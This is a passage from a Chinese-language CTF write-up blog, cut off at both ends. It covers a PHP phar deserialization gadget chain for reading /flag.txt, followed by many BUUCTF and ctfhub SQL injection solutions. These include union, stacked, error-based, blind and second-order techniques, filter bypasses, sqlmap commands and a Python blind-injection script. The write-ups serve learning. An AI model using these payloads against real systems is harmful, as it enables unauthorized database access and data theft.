class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;; $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;; &#125; echo $table; &#125; &#125; class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename &#x3D; $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size &#x3D; filesize($this-&gt;filename); $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;); for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125; &#125; ?&gt; delete.php &lt;?php session_start(); if (!isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: login.php&quot;); die(); &#125; if (!isset($_POST[&#39;filename&#39;])) &#123; die(); &#125; include &quot;class.php&quot;; chdir($_SESSION[&#39;sandbox&#39;]); $file &#x3D; new File(); $filename &#x3D; (string) $_POST[&#39;filename&#39;]; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header(&quot;Content-type: application&#x2F;json&quot;); $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;); echo json_encode($response); &#125; else &#123; Header(&quot;Content-type: application&#x2F;json&quot;); $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;); echo json_encode($response); &#125; ?&gt; phar反序列化利用条件： 1）phar文件要能够上传至服务器 2）要有可用的魔术方法为跳板 3）文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤 对于本题而言，第一条满足，第二条有一个魔术方法__call()和FileList类、User类的__destruct()，恐怕想不利用它们也不行，第三条后半部分没问题，前半部分则需要我们找一找。 既文件操作函数，就应该在本题的File类（至多也在FileList类）的方法中寻找，毕竟整个题目基本上都是在面向对象的基础上编程，对文件的操作也都是对File类的对象的操作， 我们看到，open()方法调用了file_exists()和is_dir()函数（注意name方法里的basename函数不算），size()方法调用了filesize()函数，delete()方法调用了unlink()函数，close()方法file_get_contents()函数。 本题要读取/flag.txt文件，故刚刚列举的这些函数中，虽然文件操作函数不少，可以用来触发反序列化，对读取文件有用的只有close()方法中的file_get_contents()函数这一个，所以我们可以对它分析， 这个时候，如果想不到__call()方法和__destruct()方法，基本上就可以放弃了，在phar题目里，魔术方法一般来讲是必须要用的， 这里我们看到，FileList的__call()方法语义简单，就是遍历files数组，对每一个file变量执行一次$func，然后将结果存进$results数组， 接下来的__destruct__函数会将FileList对象的funcs变量和results数组中的内容以HTML表格的形式输出在index.php上（我们可以看到，index.php里创建了一个FileList对象，在脚本执行完毕后触发__destruct__，则会输出该用户目录下的文件信息）， User对象的__destruct()方法， 无非就是 脚本执行完毕后，执行$db的close()的方法（来关闭数据库连接），但话说回来，没有括号里的话，这句话依然成立，而且这个&#39;close&#39;与File类中的close()方法同名。所以，当db的值为一个FileList对象时，User对象析构之时，会触发FileList-&gt;close()，但FileList里没有这个方法，于是调用_call函数，进而执行file_get_contents($filename)，读取了文件内容。整个链的结构也很简单清晰：在我们控制$db为一个FileList对象的情况下，$user-&gt;__destruct() =&gt; $db-&gt;close() =&gt; $db-&gt;__call(&#39;close&#39;) =&gt; $file-&gt;close() =&gt; $results=file_get_contents($filename) =&gt; FileList-&gt;__destruct()输出$result。 反序列化脚本 &lt;?php class User &#123; public $db; &#125; class File&#123; public $filename; public function __construct($name)&#123; $this-&gt;filename&#x3D;$name; &#125; &#125; class FileList &#123; private $files; public function __construct()&#123; $this-&gt;files&#x3D;array(new File(&#39;&#x2F;flag.txt&#39;)); &#125; &#125; $o &#x3D; new User(); $o-&gt;db &#x3D;new FileList(); @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar-&gt;setMetadata($o); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); ?&gt; 参考文章 CISCN2019 华北赛区 Day1 Web1]Dropbox之愚见 - 简书 (jianshu.com) CISCN2019 华北赛区 Day1 Web1]Dropbox_silence1_的博客-CSDN博客_buuctf 反序列化","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"sql题wp","slug":"buu-sql题wp","date":"2021-06-16T08:30:58.000Z","updated":"2022-10-03T14:54:21.991Z","comments":true,"path":"2021/06/16/buu-sql题wp/","link":"","permalink":"https://ethe448.github.io/2021/06/16/buu-sql%E9%A2%98wp/","excerpt":"sql好难.jpg","text":"sql好难.jpg [极客大挑战 2019]EasySQL 用户框里输入单引号出现报错，猜测为字符型注入 利用1&#39;or 1#注入得到flag [强网杯 2019]随便注先试一下万能密码 利用1‘ order by 可以试出该表中存在两个字段 接下来要用堆叠查询（利用分号执行多个sql语句） 尝试先查询数据库 成功。 再查询表名 看到有两个表，查询两个表中的字段 words表内存在两个字段 1919810931114514表内存在一个字段，flag在该表内。 （查询该表时表名要在反单引号内） 1&#39;;show columns from 1919810931114514# 所以可以猜测 内部查询语句类似 : select id, data from words where id = 所以要把words表改为word1，将flag所在的表表名改为words，然后将flag改名为id； payload：1&#39;;rename table words to word1;rename table 1919810931114514 to words; alert table words change flag id varchar(100);# 再用1’ or 1#注入 也可以把words表改为words，将flag所在的表表名改为words，再为其添加id列，并将flag改为data payload：1&#39;;rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# 再将1提交可直接获得flag [SUCTF 2019]EasySQL进入后输入1有回显 输入1‘无回显猜测是数字型注入 用堆叠注入的方式 查到存在一个flag表，尝试查看里面的内容 大概是被过滤了，只好百度搜wp了 看到dalao能够猜出后端语句为select &quot;.$ post[&#39;query&#39;].&quot;||flag from Flag （搜到一篇wp说原环境中存在源码泄露，所以能够知道这部分的sql语言，但是buu的环境里没有 SUCTF 2019] EasySQL_Senimo-CSDN博客 解法一：输入*,1 由于||在MySQL中起或的作用，因此1||flag会返回1，也就变成了 select *,1 from Flag. 成功找到flag 如果查询的参数不存在，那就会创建一个临时的列，并且设置该列所有参数都是查询的参数。所以整个payload语句的意思就是查询所有数据，然后增加了一个临时列，结果看图，第一列是数据库中的数据，第二列是添加的临时列1 因此在查询的flag后还有一个值为1的临时列 解法二 把&quot;||&quot;变成字符串连接符，而不是或。这里涉及到mysql中sql_mode参数设置，设置sql_mode=pipes_as_concat字符就可以设置。 payload：1;set sql_mode=PIPES_AS_CONCAT;select 1 也能获得flag。 这是查询语句相当于select 1flag from Flag (不太懂为啥这样也能查出来，1flag是列名如果Flag表里没有这一列呢？？) [极客大挑战 2019]LoveSQL用到了联合查询 原理篇——sql注入2：联合查询注入 - 这太秃然了 - 博客园 (cnblogs.com) SQL注入之联合查询注入_selecthch的博客-CSDN博客_联合注入 参考一下 常规步骤 1. 判断注入点 2. 判断注入类型（数字型型or字符型） 3. 判断字段数 4. 判断回显位 5. 确定数据库名 6. 确定表名 7. 确定字段名 8. 拿到数据 1.判断注入点 ​ 在输入的用户名后添加单引号返回出错，猜测存在注入 2.判断注入类型 ​ 在用户名后输入1’ or 1#后成功进入，但还是没有拿到flag，因此继续尝试注入 3.判断字段数 ​ 当order by 4时出错，因此应有三个字段数 4.判断回显位 5。确定数据库名 ​ 为了获取所有数据库名，要利用group_concat()函数令其一次性显示出来 1&#39; union select 1,2,group_concat(database());# 6.确定表名 1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();# 【INFORMATION_SCHEMA 数据库】 是MySQL自带的，它提供了访问数据库 元数据 的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。 常用字段 字段 含义 Table_catalog 数据表登记目录 Table_schema 数据表所属的数据库名 Table_name 表名称 Table_type 表类型[system view|base table] Engine 使用的数据库引擎[MyISAM|CSV|InnoDB] Version 版本，默认值10 Row_format 行格式[Compact|Dynamic|Fixed] Table_rows 表里所存多少行数据 Avg_row_length 平均行长度 Data_length 数据长度 Max_data_length 最大数据长度 Index_length 索引长度 Data_free 空间碎片 Auto_increment 做自增主键的自动增量当前值 Create_time 表的创建时间 Update_time 表的更新时间 Check_time 表的检查时间 Table_collation 表的字符校验编码集 Checksum 校验和 Create_options 创建选项 Table_comment 表的注释、备注 确定字段名 猜测flag应该在l0ve1ysq1表中，因此查找该表内的字段名 1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;;# 8.拿到数据 查找这三列中的全部数据，利用group_concat(); 1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1#; 得到flag MySQL默认有“information_schema”的数据库，该库中有三个表名： 1、SCHEMATA：存储该用户创建的所有数据库的库名，记录库名的字段为SCHEMA_NAME。2、TABLES：存储该用户创建的所有数据库的库名和表名，记录库名和表名的字段为TABLE_SCHEMA和TABLE_NAME。3、COLUMNS：存储该用户创建的所有数据库的库名、表名和字段名，库名、表名和字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。 ctfhub—SQL 整数型注入输入1有回显 输入1 and 1=2无回显，既存在注入点，整数型注入 利用order by可知存在两个字段 利用联合查询查询数据库名称 再查找表名 flag应该就在flag表内，再查找字段名 最后得到flag ctfhub—SQL字符型注入利用order by判断字段数 输入-1&#39; union select 1,2#判断回显位置 查数据库名 查表名 查字段名 查flag -1&#39; union select 1,group_concat(flag) from flag# 感觉和整数型注入差不多 ctfhub—报错注入利用xpath语法错误来进行报错注入主要利用extractvalue和updatexml两个函数。 extractvalue() 函数原型：extractvalue(xml_document,Xpath_string) 正常语法：extractvalue(xml_document,Xpath_string); 第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：Xpath_string是xpath格式的字符串 作用：从目标xml中返回包含所查询值的字符串 第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容 payload模板 &#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) 0x7e=’~’ concat(‘a’,‘b’)=“ab” version()=@@version ‘~‘可以换成’#’、’$&#39;等不满足xpath格式的字符 extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位 返回结果不能超过一条 若超过则需再查询语句后添加limit x,1或用group_concat()函数 updatexml() updatexml()函数与extractvalue()类似，是更新xml文档的函数。 and 1=(updataxml(1,concat(0x7e,(sql_inject),0x7e),1)) flood() 原理还没看明白（ 先放个模板在这 1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x; 题目： 利用extractvalue 输入单引号提示语法错误，输入and 1=1能正确查询，猜测为数字型，利用extractvalue函数爆库名 再爆表名 这里提示太长因此利用group_concat()函数 猜到flag再flag表内爆列名 最后查询内容 1 and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1),0x7e)) 由于extractvalue函数只能显示32位字符，所以要利用substring函数进行分割 利用substring查看右边31位字符 最后可以拿到flag ctfhub{ff3bb0327849e1b9e0e6abfd} 利用updataxml函数 利用flood函数 ctfhub—布尔盲注只有出现数据提交正确和错误两种不同的页面（报错型至少语法错误会回显错误到页面上）或者无法使用联合查询。 步骤 用错误和正确两种反馈进行逐一试验，猜测出闭合 利用length来逐一测试字符串的长度 利用substr来逐一的测试，测试库名、表名、列名和其他数据 最后得到数据 函数 length() 返回字符串的长度 length(abc) 返回3，表示abc字符串长度为3 substr() 截取字符串 substr(abc,1,1) 返回a，从abc的第一位开始截取，步长为1 mid() 取出字符串的一部分值 mid(abc,1,1) 返回a，从abc的第一位开始取，步长为1， 与substr()用法一致 left() 取出字符串左边的几个数据 left(abc,1) 返回a left(abc,2) 返回ab right() 取出右边的几个数据 right(abc,1) 返回c right(abc,2) 返回bc ord() 与ascii() 返回一个字符的ascii码值 ascii(s) 返回114 hex() 返回16进制数 先猜数据库长度&gt;3时返回成功，&gt;4时返回失败可以得到数据库名长度为4 接下来利用substr和ascii函数猜名字 首字母ascii码大于114时返回成功，大于115时返回失败，可得到首字母的ascii码为115，为s 第二位同理可以得到ascii码值为113，为q 最后可得数据库名为sqli 再猜表名 1 and substr((select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1),1,1)=&#39;n&#39; （感觉这部分应该用bp抓包爆破更方便） 把limit后的0改为1猜第二个表名 最后能得到有news和flag两个表 再猜字段 首字母ascii码为102，为f 同理能得到字段名为flag 最后爆内容 太多了，用bp爆破完感觉也很难找，估计用py写脚本会方便很多 用sqlmap： -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 --dbs查库名 -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables 查表名 -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns查字段名 -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dump查值 ctfhub—时间盲注利用sleep函数进行盲注 若and之前的语句正确则成功执行sleep 能得到是数字型注入 接下来利用if语句进行注入是否成功的判断1 and if(查询语句,sleep(2),1) 若为真则执行sleep（2），若为假则执行1 接下来步骤与布尔盲注相似 猜数据库名（也可以利用ascii码来猜，但因为ctfhub的sql题名称都一样，就直接试字符了） 1 and if(substr(database(),1,1)=&#39;s&#39;,sleep(2),1)# 猜表的数量 1 and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(2),1)# 猜表名 1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;0,sleep(2),1)# 将limit后的0改为1再猜第二个表名 分别为news 和 flag 猜flag表内字段数量 1 and if((select count(column_name) from information_schema.columns where table_name=&#39;flag&#39;)=1,sleep(2),1)# 猜字段名 1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;flag&#39; limit 0,1),1,1))&gt;102,sleep(2),1)# 最终可以猜出字段名为flag 再猜内容 1 and if(ascii(substr((select flag from flag limit 0,1),1,1))&gt;99,sleep(2),1)# 这部分应该还是要用python或者sqlmap 过滤空格看题目就知道空格被过滤了，这里可以利用/**/注释符来替代空格，其他步骤和字符型注入一样 最后得到flag 贴个别人总结的过滤和绕过 SQL注入一些过滤及绕过总结_obsetear的博客-CSDN博客 [极客大挑战 2019]BabySQL看到界面提示存在过滤 输入1&#39; and 1=1# 1‘ or 1# 1&#39; and select 1 from 1#等语句根据返回的错误信息可以知道过滤了select or and union from by where 这里可以利用双写绕过，首先利用order by查字段数可以查到表内有三列 1&#39; oorrder bbyy 4;# 接下来可以利用联合查询 先看回显1&#39; ununionion selselectect 1,2,3;# 查库名1&#39; ununionion selselectect 1,2,database();# 查表名 1&#39; ununionion selselectect 1,2,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database());# flag应该在b4bsql表里，爆一下列名 1&#39; ununionion selselectect 1,2,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;);# 最后爆内容1&#39; ununionion selselectect 1,2,(selselectect group_concat(id,username,passwoorrd) frfromom b4bsql);# [极客大挑战 2019]HardSQL试了一下，and union 空格 等于都被过滤了尝试了几种绕过姿势都没成功，看了下别人的wp说是报错注入 利用括号来去掉查询语句中的空格 先查库 0&#39;or(extractvalue(1,concat(0x7e,(database()),0x7e)))# 再查表 由于等于号也被过滤了，所以要用like admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e)))# 爆列名 admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))),0x7e)))# 最后爆内容 admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e)))# flag{66f2f5cd-207d-4d50-87 由于extractvalue显示字符数的限制，要用substr函数对其进行分割 admin&#39;or(extractvalue(1,concat(0x7e,right((select(group_concat(id,username,password))from(H4rDsq1)),31),0x7e)))# cd-207d-4d50-87bd-d8b762ffce95} 最后拼一下得到flag flag{66f2f5cd-207d-4d50-87bd-d8b762ffce95} [SWPU2019]Web1进入后是个登录页面，注册个账号之后登录 可以知道注入点在广告位上 试一下可以知道or and #都被过滤了 因为过滤了＃号，所以要保证后面的单引号能闭合 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;‘1’&#x3D;‘1 得到回显位置2，3. 因为or被过滤，且无法通过大小写和双写绕过，那么information_schema因为含有or，所以也没法使用。这里有两种方法可以绕过 SQL注入：限制条件下获取表名、无列名注入 - MustaphaMond - 博客园 (cnblogs.com) InnoDb引擎从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。sys数据库在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。 sys数据库需要root权限，而innoDb在mysql中默认关闭 限制：mysql ≥ 5.7版本 先查一下数据库版本 因此可以利用innoDb来查表名 系统Mysql库中存在两张与innodb相关的表：innodb_table_stats和innodb_index_stats。 所以可以通过查找这两个表取代information的作用 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1 或 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_index_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1 得到表名为ads和users 猜flag在users表内，进行无列名注入 无列名注入原理 无列名注入的原理就是在取别名的同时查询数据。通过无列名查询构造一个虚拟表，在构造此表的同时查询其中的数据。 表的列数也要一次次试 （不太懂为啥这里的列数不是22) CTF|mysql之无列名注入 - 知乎 (zhihu.com) [SWPU2019]Web1 - 王叹之 - 博客园 (cnblogs.com) 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2, (select&#x2F;**&#x2F;group_concat(&#96;3&#96;)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#39;1&#39;&#x3D;&#39;1 如果反引号被过滤，就要对字段利用别名替代 还可以利用join爆列名 join后的列名是两个表列名加起来的，可能会产⽣相同的列名，如id和name，使⽤别名时，表中不能出现同的字段名，这就跟join第⼀个特点相冲突，所以在join和别名同时使⽤时会导致报错 当通过查询得到新的表时，必须有一个别名，即每个派生出来的表都必须有一个自己的别名 二次注入原理 二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。 二次注入，可以概括为以下两步: 第一步：插入恶意数据 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。 第二步：引用恶意数据 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。 记考核赛的一次sql盲注 (strcmp(ascii(substr(REVERSE(tceles)(table_name)from(mysql.innodb_table_stats)where((table_schema)like(database())),1,1)),10000))%23 ||strcmp(ascii(substr((select(table_name)from(mysql.innodb_table_stats))where((database_name)like(database())),1,1)),1)%23 username=admin&amp;password=||((ascii(mid((pwd)from(1))))like(12))%23 YouAresOgOoD select(table_name)from(information_schema.tables)where(table_schema=database()) ||(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),§1§,1))=§0§)%23 flag_1s_her3 ||(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c61675f31735f68657233)),§1§,1))=§0§)%23 flag{sql1_1s_s0_ea3y} [CISCN2019 华北赛区 Day2 Web1]Hack Worldsql注入，先用fuzz测一下过滤（buu的网站好像有访问限制，所以post到后面之后因为请求太多了会直接报429，而且不知道是不是bp的问题有些没有过滤的也会被显示为被过滤了 这里应该要采用bool盲注的方式，但是过滤的东西有点多 因为空格被过滤了所以要利用（）来代替空格 抄了个脚本 感觉是很简单的盲注，然后要利用python编脚本 [GXYCTF2019]BabySQli GXYCTF2019]BabySQli——“绕过md5比较”_WHOAMIAnony的博客-CSDN博客 当用户名为admin时，提示密码错误，因此能知道用户名为admin 登录后跳转到search.php中，在源码里存在一个进行base加密的提示 sql注入，先fuzz看一下过滤 然后可以利用大写绕过查到共有3列（其实直接union试也可以 之后要利用联合注入 在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。 后端代码 &lt;?php$row; $pass&#x3D;$_POST[&#39;pw&#39;]; if($row[&#39;username&#39;]&#x3D;&#x3D;’admin’)&#123; if($row[&#39;password&#39;]&#x3D;&#x3D;md5($pass))&#123; echo $flag; &#125;else&#123; echo “wrong pass!”; &#125;&#125; else&#123; echo “wrong user!”;&#125; 所以可以在联合查询时构造虚拟的数据利用这个数据进行登录操作 username&#x3D;0&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39; # password&#x3D;123 得到flag [GYCTF2020]Blacklist这个看起来和强网杯那个有点像 同样也是堆叠注入 可以用 1&#39;;show tables;#查表 flag应该就在flaghere这个表里 看一下列名 想查看的时候发现存在过滤 这里可以利用headler HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭 最终payload：1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;# 1&#39;;handler score open;handler score read first;handler score close;# （试了一下利用headler强网杯的那道也能注出来 关于handler命令转载自:https://blog.csdn.net/jesseyoung/article/details/40785137 mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。 基本语法： HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE 通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tbl_name的句柄。通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。通过HANDLER tbl_name CLOSE来关闭打开的句柄。 通过索引去查看的话可以按照一定的顺序，获取表中的数据。通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。 通过索引列指定一个值，可以指定从哪一行开始。通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。 如果我们不想浏览一个表的所有行，可以使用where和limit子句。 [极客大挑战 2019]FinalSQL盲注，注入点在id 可以利用异或来进行盲注 找个脚本直接爆破，学一下这个脚本 import requests import sys import time def get_DBlen(url): for i in range(1,10): db_url &#x3D; url+&quot;1^1^(length(database())&#x3D;%d)#&quot;%i r &#x3D; requests.get(db_url) if &quot;Click&quot; in r.text: print(&quot;数据库名称的长度为:%d&quot;%i) return i def get_DBname(url,length): DBname &#x3D; &quot;&quot; length &#x3D; length + 1 for i in range(1,length): Max &#x3D; 122 Min &#x3D; 41 Mid &#x3D; (Max+Min)&#x2F;&#x2F;2 while Min &lt;&#x3D; Max: # 爆表名 db_url &#x3D; url+&quot;1^1^(ascii(substr(database(),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid) r &#x3D; requests.get(db_url) if &quot;Click&quot; in r.text: Min&#x3D;Mid+1 Mid&#x3D;(Min+Max)&#x2F;&#x2F;2 pass else: Max &#x3D; Mid-1 Mid &#x3D; (Min+Max)&#x2F;&#x2F;2 pass pass DBname &#x3D; DBname + chr(Mid) print(DBname) return DBname def get_TBname(url): name&#x3D;&quot;&quot; i &#x3D; 0 while True: i &#x3D; i+1 Max &#x3D; 128 Min &#x3D; 32 Mid &#x3D; (Max+Min)&#x2F;&#x2F;2 while Min &lt;&#x3D; Max: # 爆表名 # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid) # 爆字段名 # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid) # 获取flag db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;&#x3D;%d)&quot;%(i,Mid) r &#x3D; requests.get(db_url) if &quot;Click&quot; in r.text: Min&#x3D;Mid+1 Mid&#x3D;(Min+Max)&#x2F;&#x2F;2 pass else: Max&#x3D;Mid-1 Mid&#x3D;(Min+Max)&#x2F;&#x2F;2 pass pass name&#x3D;name+chr(Mid) print(name) if Mid &#x3D;&#x3D; 31: break time.sleep(0.5) if __name__&#x3D;&#x3D;&quot;__main__&quot;: url &#x3D; &quot;http:&#x2F;&#x2F;0b2df33c-3f5b-4b49-ae98-ca2c2c2e55bf.node4.buuoj.cn:81&#x2F;search.php?id&#x3D;&quot; db_Len &#x3D; get_DBlen(url) db_Name &#x3D; get_DBname(url,db_Len) tb_name &#x3D; get_TBname(url) [CISCN2019 华北赛区 Day1 Web5]CyberPunk第一次遇见二次注入的题，正好学一下 源码里有个file，猜测有文件包含，可以利用伪协议读取这几个页面的源码 change.php页面 &lt;?php require_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])) &#123; $msg &#x3D; &#39;&#39;; $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;; $user_name &#x3D; $_POST[&quot;user_name&quot;]; $address &#x3D; addslashes($_POST[&quot;address&quot;]); $phone &#x3D; $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg &#x3D; &#39;no sql inject!&#39;; &#125;else&#123; $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;; $fetch &#x3D; $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row &#x3D; $fetch-&gt;fetch_assoc(); $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;]; $result &#x3D; $db-&gt;query($sql); if(!$result) &#123; echo &#39;error&#39;; print_r($db-&gt;error); exit; &#125; $msg &#x3D; &quot;订单修改成功&quot;; &#125; else &#123; $msg &#x3D; &quot;未找到订单!&quot;; &#125; &#125;else &#123; $msg &#x3D; &quot;信息不全&quot;; &#125; 主要的漏洞点就在change.php 因为其他输入位置过滤的太多，基本能注入的都被过滤了，所以只能利用address 在创建address时虽然对输入的数据进行了addslashes过滤 但之后还会对旧address进行一次sql查询 因此可以利用二次注入，再结合报错注入，和load_file函数读取flag文件 在创建时在地址中输入注入语句 1&#39; where user_id=updatexml(1,concat(0x7e,(select 